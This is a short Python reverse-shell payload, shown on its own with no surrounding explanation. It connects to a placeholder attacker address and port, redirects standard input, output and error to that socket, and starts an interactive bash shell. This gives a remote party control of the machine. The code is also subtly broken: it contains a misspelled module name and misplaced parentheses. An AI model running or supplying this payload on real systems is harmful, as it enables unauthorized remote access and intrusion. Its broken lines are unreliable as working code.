import socket, subprocess, os;
s = socket.socket((socketn.AF_INET, socket.SOCK_STREAM));
s.connect(("<ATTACKER_IP>", <ATTACKER_PORT>));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(), 1);
os.dup2(s.fileno(), 2);
p = subprocess.call(["/bin/bash", "-i"]);
